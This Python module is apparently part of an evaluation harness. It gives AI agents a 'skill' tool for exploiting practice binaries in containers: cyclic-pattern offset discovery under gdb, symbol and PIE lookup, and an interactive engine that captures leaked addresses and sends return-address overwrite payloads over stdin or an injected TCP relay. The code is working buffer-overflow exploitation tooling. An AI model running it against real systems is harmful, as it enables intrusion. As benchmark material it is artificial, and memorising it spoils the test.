"""Executable skill compilation: curated exploitation procedures exposed as a
single `skill` tool for container-bound agent runs.

The model supplies intent (which procedure, which binary); these host-side
implementations supply the craft. Logic ported from homework/solve_rung1.py —
that file stays untouched as the solvability-proof artifact.
"""
import asyncio
import re
import struct


# ---- De Bruijn cyclic pattern (pwntools-free) --------------------------------
def cyclic(n: int, subseq: int = 4) -> bytes:
    """De Bruijn sequence over a lowercase alphabet, byte length n."""
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in seq).encode()[:n]


def cyclic_find(haystack: bytes, needle: bytes) -> int:
    """Offset of a byte fragment (e.g. a little-endian register value), or -1."""
    return haystack.find(needle)


def parse_payload(spec: str) -> bytes:
    """Parse a payload spec like 'A*72 + p64(0x4011d6)' into bytes.

    Terms separated by '+': '<char>*<count>' repeats, 'p32(0xADDR)' / 'p64(0xADDR)'
    little-endian packed addresses (hex or decimal). Raises ValueError on anything
    else so the caller can hand the message back to the agent."""
    out = b""
    for term in spec.split("+"):
        term = term.strip()
        if not term:
            continue
        m = re.fullmatch(r"(.)\s*\*\s*(\d+)", term)
        if m:
            out += m.group(1).encode("latin-1") * int(m.group(2))
            continue
        m = re.fullmatch(r"p(32|64)\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)", term)
        if m:
            fmt = "<I" if m.group(1) == "32" else "<Q"
            out += struct.pack(fmt, int(m.group(2), 0))
            continue
        raise ValueError(f"unparseable term {term!r} (want X*N or p64(0xADDR))")
    if not out:
        raise ValueError("empty payload spec")
    return out


# ---- docker-backed skills -----------------------------------------------------
# Each coroutine: (cexec, args: str, spawn=None) -> str. cexec runs argv inside
# the bound container and returns (exit_code, combined_output); spawn (when the
# harness provides one) starts an interactive async subprocess for the pwn_*
# skills. Skills NEVER raise — failures come back as diagnostic text the agent
# can act on.

_FALLBACK_OFFSET = 72  # 64-byte buf + saved rbp at -O0, verified on homework rungs


async def _skill_discover_offset(cexec, args: str, spawn=None) -> str:
    binary = args.split()[0] if args.split() else ""
    if not binary:
        return "usage: skill discover_offset <binary-path>"
    pat = cyclic(256)
    await cexec("bash", "-c", "cat > /tmp/pat.txt", input_bytes=pat)
    code, out = await cexec(
        "gdb", "-q", "-batch",
        "-ex", "run < /tmp/pat.txt",
        "-ex", "info registers rip",
        "-ex", "x/1gx $rsp",
        binary, timeout=120)
    m = re.search(r"rip\s+(0x[0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", rip)[:4])
        if off >= 0:
            return (f"offset to saved return address: {off} "
                    f"(crash rip=0x{rip:x} located in cyclic pattern)")
    # Non-canonical ret: $rip still points at ret; the return slot is at $rsp.
    m = re.search(r"0x[0-9a-f]+:\s+(0x[0-9a-f]+)", out)
    if m:
        slot = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", slot))
        if off >= 0:
            return (f"offset to saved return address: {off} "
                    f"(non-canonical ret; return slot @rsp=0x{slot:x})")
    return ("offset discovery INCONCLUSIVE — gdb output:\n" + out[-800:] +
            f"\nfallback for -O0 layout (64-byte buf + saved rbp): {_FALLBACK_OFFSET}")


async def _skill_find_symbol(cexec, args: str, spawn=None) -> str:
    parts = args.split()
    if len(parts) < 2:
        return "usage: skill find_symbol <binary> <symbol>"
    binary, name = parts[0], parts[1]
    code, out = await cexec("nm", binary)
    m = re.search(rf"^([0-9a-f]+) [Tt] {re.escape(name)}$", out, re.M)
    if not m:
        return (f"symbol '{name}' not found as a text symbol in nm output "
                f"(exit {code}):\n{out[:800]}")
    addr = int(m.group(1), 16)
    _, hdr = await cexec("readelf", "-h", binary)
    type_line = next((l for l in hdr.splitlines() if "Type:" in l), "")
    if "DYN" in type_line:
        return (f"{name} is at file offset 0x{addr:x} — PIE binary: "
                f"runtime address = leaked_base + 0x{addr:x}")
    return f"{name} = 0x{addr:x} (absolute address — non-PIE binary)"


async def _skill_cyclic(cexec, args: str, spawn=None) -> str:
    try:
        n = int(args.split()[0])
    except (IndexError, ValueError):
        return "usage: skill cyclic <length>  (prints a De Bruijn pattern)"
    return cyclic(min(n, 4096)).decode("latin-1")


async def _skill_cyclic_find(cexec, args: str, spawn=None) -> str:
    tok = args.split()[0] if args.split() else ""
    tok = tok[2:] if tok.startswith("0x") else tok
    try:
        needle = bytes.fromhex(tok)
    except ValueError:
        return "usage: skill cyclic_find <hexbytes>  e.g. cyclic_find 0x62616164"
    off = cyclic(4096).find(needle)
    if off < 0:
        return f"{tok} not found in the standard cyclic pattern"
    return f"offset of 0x{tok} in the cyclic pattern: {off}"


async def _skill_deliver_stdin(cexec, args: str, spawn=None) -> str:
    binary, _, spec = args.strip().partition(" ")
    if not binary or not spec.strip():
        return ("usage: skill deliver_stdin <binary> <spec>  "
                "e.g. skill deliver_stdin /target/rung1 A*72 + p64(0x4011d6)")
    try:
        payload = parse_payload(spec)
    except ValueError as e:
        return f"bad payload spec: {e}"
    code, out = await cexec(binary, input_bytes=payload, timeout=30)
    return f"[sent {len(payload)} bytes on stdin, exit {code}]\n{out.rstrip()}"


# ---- interactive step engine (pwn_stdin / pwn_tcp) ----------------------------
# Leak-and-deliver in ONE session: expect a banner, bind the leak, deliver the
# payload — the only shape that works under ASLR (rung 2 autopsy 2026-07-28:
# one-shot deliver_stdin spawns a fresh process, so leaked runtime addresses
# were always garbage).

_MAX_STEPS = 8

_LEAK_RE = re.compile(
    r"\{(leak\d*)\s*(?:([+-])\s*(0x[0-9a-fA-F]+|\d+))?\}"  # {leak}, {leak-0xb9}
    r"(?:\s*([+-])\s*(0x[0-9a-fA-F]+|\d+))?")              # or {leak}-0xb9


def render_template(template: str, leaks: dict) -> bytes:
    """Substitute {leak}/{leakN} with captured integers (offset inside the
    braces `{leak-0xb9}` or just outside `{leak}-0xb9` — both accepted), then
    parse terms: 'X*N' repeats, p32/p64 packed addresses; anything else is
    LITERAL text (menu answers like '1'). Raises ValueError only on unknown
    leak refs or an empty template."""
    def sub(m):
        name = m.group(1)
        if name not in leaks:
            raise ValueError(f"template references {{{name}}} but no expect "
                             f"captured it (captured: {sorted(leaks) or 'none'})")
        v = leaks[name]
        for sign, off in ((m.group(2), m.group(3)), (m.group(4), m.group(5))):
            if off:
                delta = int(off, 0)
                v = v + delta if sign == "+" else v - delta
        return hex(v)
    template = _LEAK_RE.sub(sub, template)
    out = b""
    for term in template.split("+"):
        term = term.strip()
        if not term:
            continue
        m = re.fullmatch(r"(.)\s*\*\s*(\d+)", term)
        if m:
            out += m.group(1).encode("latin-1") * int(m.group(2))
            continue
        m = re.fullmatch(r"p(32|64)\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)", term)
        if m:
            fmt = "<I" if m.group(1) == "32" else "<Q"
            out += struct.pack(fmt, int(m.group(2), 0))
            continue
        out += term.encode("latin-1")  # literal text term (menu answers etc.)
    if not out:
        raise ValueError("empty send template")
    return out


def parse_steps(arg_tail: str):
    """Parse the step grammar into (steps, hex8, error).

    Steps: expect:<regex> (single non-space token, one capture group binds the
    leak) and send:<template> (may contain spaces; runs to the next step
    token). Shorthand: '<regex> <template...>' == expect+send; inside explicit
    mode 'expect:<regex> <template...>' nests the same shorthand, and that
    unlabeled send must be the final step. Bare 'hex8' flags ExploitGym's
    8-byte-hex size prefix on the final send."""
    tokens = arg_tail.split()
    hex8 = "hex8" in tokens
    tokens = [t for t in tokens if t != "hex8"]
    explicit = any(t.startswith("expect:") or t.startswith("send:") for t in tokens)
    steps: list = []

    if not explicit:
        if len(tokens) < 2:
            return None, False, (r"usage: <regex> <template>  e.g. "
                                 r"main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9)")
        steps = [("expect", tokens[0]), ("send", " ".join(tokens[1:]))]
    else:
        cur_op = None
        cur_val: list = []
        implicit_send = None  # steps-index of an unlabeled send, if any

        def flush():
            nonlocal cur_op, cur_val
            if cur_op is not None:
                steps.append((cur_op, " ".join(cur_val).strip()))
            cur_op, cur_val = None, []

        for t in tokens:
            if t.startswith("expect:") or t.startswith("send:"):
                flush()
                op, _, first = t.partition(":")
                cur_op = op
                cur_val = [first] if first else []
            else:
                if cur_op is None:
                    return None, False, ("step text %r outside any expect:/send: "
                                         "step" % t)
                if cur_op == "expect" and cur_val:
                    # expect takes ONE token; trailing bare tokens are the
                    # shorthand send template ('expect:R T...' == expect R,
                    # send T). It must be the FINAL step — there is no
                    # delimiter for its end.
                    flush()
                    cur_op, cur_val = "send", [t]
                    implicit_send = len(steps)
                else:
                    cur_val.append(t)
        flush()
        if implicit_send is not None and implicit_send != len(steps) - 1:
            return None, False, ("unlabeled send template must be the FINAL "
                                 "step; prefix earlier sends with send:")

    if len(steps) > _MAX_STEPS:
        return None, False, f"too many steps ({len(steps)}); max {_MAX_STEPS}"
    if not any(op == "send" for op, _ in steps):
        return None, False, "no send step — nothing to deliver"
    for op, val in steps:
        if not val:
            return None, False, f"empty {op} step"
        if op == "expect":
            if " " in val:
                return None, False, (rf"expect regex must be ONE non-space token "
                                     rf"(got {val!r}); write e.g. main:\s*(0x[0-9a-f]+)")
            try:
                re.compile(val)
            except re.error as e:
                return None, False, f"bad expect regex {val!r}: {e}"
    return steps, hex8, None


# ---- session engine (run_steps) -------------------------------------------------

_EXPECT_TIMEOUT = 15
_READ_CAP = 65536

_RELAY_PATH = "/tmp/tcp_relay.py"
# TCP relay, injected into the agent container: bridges its stdin/stdout to a
# socket. ExploitGym servers live on an internal docker network the HOST can't
# reach, so the dial must happen container-side. python 3.5-safe (no f-strings,
# no os.set_blocking) — ExploitGym images ship xenial-era python.
_RELAY_SRC = """\
import socket, sys, os, select

s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
watch = [0, s]
while watch:
    r, _, _ = select.select(watch, [], [], 60)
    if not r:
        break
    for fd in r:
        if fd == 0:
            data = os.read(0, 65536)
            if data:
                s.sendall(data)
            else:
                s.shutdown(socket.SHUT_WR)
                watch.remove(0)
        else:
            data = s.recv(65536)
            if not data:
                os._exit(0)
            os.write(1, data)
"""


async def _read_until(proc, pattern: str, deadline: float, buf: str) -> tuple:
    """Read until the regex matches, the deadline passes, EOF, or the read cap.
    `buf` is UNCONSUMED text carried over from the previous expect — a banner
    holding two leaks must not lose its tail. Returns (consumed, rest, match)
    where consumed+rest is everything read so far; match is None on failure.
    latin-1 decode: 1:1 byte map."""
    rx = re.compile(pattern)
    loop = asyncio.get_running_loop()
    while True:
        m = rx.search(buf)
        if m:
            return buf[:m.end()], buf[m.end():], m
        if len(buf) >= _READ_CAP:
            return "", buf, None
        remaining = deadline - loop.time()
        if remaining <= 0:
            return "", buf, None
        try:
            chunk = await asyncio.wait_for(proc.stdout.read(4096), remaining)
        except asyncio.TimeoutError:
            return "", buf, None
        if not chunk:
            return "", buf, None
        buf += chunk.decode("latin-1")


def _to_int(text: str) -> int:
    try:
        return int(text, 0)
    except ValueError:
        return int(text, 16)


async def run_steps(spawn, argv: tuple, steps: list, hex8: bool = False) -> str:
    """Drive one interactive session through expect/send steps. NEVER raises —
    every failure comes back as diagnostic text with what was actually read."""
    try:
        proc = await spawn(*argv)
    except Exception as e:
        return f"spawn failed for {argv}: {e}"
    leaks: dict = {}
    captured = 0
    transcript: list = []
    buf = ""  # unconsumed text carried between expects
    last_send = max(i for i, (op, _) in enumerate(steps) if op == "send")
    try:
        for i, (op, val) in enumerate(steps):
            if op == "expect":
                deadline = asyncio.get_running_loop().time() + _EXPECT_TIMEOUT
                seen, buf, m = await _read_until(proc, val, deadline, buf)
                transcript.append(seen)
                if m is None:
                    return ("expect FAILED: pattern %r not seen (timeout %ds, "
                            "EOF, or %d-byte cap).\nwhat was actually read:\n%s"
                            % (val, _EXPECT_TIMEOUT, _READ_CAP,
                               (seen + buf)[-1200:]))
                if m.groups():
                    captured += 1
                    v = _to_int(m.group(1))
                    leaks["leak%d" % captured] = v
                    leaks["leak"] = v
            else:  # send
                try:
                    payload = render_template(val, leaks)
                except ValueError as e:
                    return "bad send template: %s" % e
                if hex8 and i == last_send:
                    payload = ("%08x" % len(payload)).encode() + payload
                proc.stdin.write(payload)
                await proc.stdin.drain()
                transcript.append(">> sent %d bytes" % len(payload))
        try:
            proc.stdin.close()
        except Exception:
            pass
        deadline = asyncio.get_running_loop().time() + _EXPECT_TIMEOUT
        rest, buf, _ = await _read_until(proc, r"(?!)", deadline, buf)  # to EOF
        transcript.append(rest + buf)
        return "\n".join(t for t in transcript if t)
    finally:
        try:
            proc.kill()
        except Exception:
            pass


async def _skill_pwn_stdin(cexec, args: str, spawn=None) -> str:
    binary, _, tail = args.strip().partition(" ")
    if not binary or not tail.strip():
        return ("usage: skill pwn_stdin <binary> <steps>  e.g. "
                r"skill pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9)")
    steps, hex8, err = parse_steps(tail)
    if err:
        return err
    if hex8:
        return "hex8 (size prefix) is only meaningful for pwn_tcp"
    if spawn is None:
        return "pwn_stdin needs an interactive-capable harness (no spawn)"
    return await run_steps(spawn, (binary,), steps)


async def _skill_pwn_tcp(cexec, args: str, spawn=None) -> str:
    if spawn is None:
        return "pwn_tcp needs an interactive-capable harness (no spawn)"
    parts = args.split(None, 2)
    if len(parts) < 3:
        return ("usage: skill pwn_tcp <host> <port> <steps> [hex8]  e.g. "
                r"skill pwn_tcp 172.18.0.5 8000 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8")
    host, port, tail = parts
    steps, hex8, err = parse_steps(tail)
    if err:
        return err
    code, _ = await cexec("test", "-f", _RELAY_PATH)
    if code != 0:
        code, out = await cexec("bash", "-c", "cat > " + _RELAY_PATH,
                                input_bytes=_RELAY_SRC.encode())
        if code != 0:
            return "failed to inject the tcp relay into the container:\n" + out
    return await run_steps(spawn, ("python3", _RELAY_PATH, host, port),
                           steps, hex8=hex8)


# ---- registry + dispatcher (after ALL coroutines are defined) -------------------

SKILLS = {
    "discover_offset": ("discover_offset <binary> — crash under gdb on a cyclic "
                        "pattern; returns the exact offset to the saved return address",
                        _skill_discover_offset),
    "find_symbol": ("find_symbol <binary> <name> — nm + PIE check; returns the "
                    "function's absolute address (non-PIE) or file offset (PIE)",
                    _skill_find_symbol),
    "cyclic": ("cyclic <n> — print a De Bruijn pattern of length n (payload padding "
               "whose every 4-byte fragment locates its own offset)",
               _skill_cyclic),
    "cyclic_find": ("cyclic_find <hexbytes> — offset of a byte fragment (e.g. a "
                    "register value) in the standard cyclic pattern",
                    _skill_cyclic_find),
    "deliver_stdin": ("deliver_stdin <binary> <spec> — run the target with a payload "
                      "on stdin; spec e.g. 'A*72 + p64(0x4011d6)'; returns its output",
                      _skill_deliver_stdin),
    "pwn_stdin": ("pwn_stdin <binary> <steps> — INTERACTIVE: leak and deliver in "
                  "ONE process (required under ASLR/PIE). Steps: expect:<regex> "
                  "send:<template>, or shorthand '<regex> <template>'. {leak}, "
                  "{leak1..N}, {leak±0xN} substitute captured addresses. e.g. "
                  "skill pwn_stdin /target/rung2 main:\\s*(0x[0-9a-f]+) "
                  "A*72 + p64({leak}-0xb9)",
                  _skill_pwn_stdin),
    "pwn_tcp": ("pwn_tcp <host> <port> <steps> [hex8] — same engine over a TCP "
                "socket (dialed from inside the container). hex8 adds "
                "ExploitGym's 8-byte-hex size prefix to the final payload. e.g. "
                "skill pwn_tcp 172.18.0.5 8000 main:\\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8",
                _skill_pwn_tcp),
}


def skill_docs() -> str:
    return "\n".join(f"          {doc}" for doc, _ in SKILLS.values())


async def run_skill(name: str, args: str, cexec, spawn=None) -> str:
    entry = SKILLS.get(name)
    if entry is None:
        return ("unknown skill '%s'; available:\n" % name) + skill_docs()
    return await entry[1](cexec, args, spawn)
